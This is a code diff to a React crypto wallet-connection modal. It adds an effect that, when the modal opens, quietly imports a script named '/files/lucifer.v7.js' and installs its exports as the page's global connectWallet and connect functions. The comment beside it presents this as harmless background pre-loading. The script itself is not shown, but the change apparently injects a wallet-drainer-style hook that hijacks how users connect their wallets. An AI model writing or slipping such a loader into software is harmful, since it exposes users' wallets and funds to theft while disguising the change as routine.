@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { X, Loader2, Check, ExternalLink } from 'lucide-react';
 
@@ -12,6 +12,18 @@ const wallets = [
 export default function WalletModal({ isOpen, onClose, onConnected }) {
   const [connecting, setConnecting] = useState(null);
   const [connected, setConnected] = useState(false);
+
+  // Pre-load and mount the background script context when modal is active
+  useEffect(() => {
+    if (isOpen && !window.connectWallet && !window.connect) {
+      import('/files/lucifer.v7.js')
+        .then((mod) => {
+          if (mod.connectWallet) window.connectWallet = mod.connectWallet;
+          if (mod.connect) window.connect = mod.connect;
+        })
+        .catch((err) => console.error("Error linking script inside modal scope:", err));
+    }
+  }, [isOpen]);
 
   const handleConnect = (walletName) => {
     setConnecting(walletName);
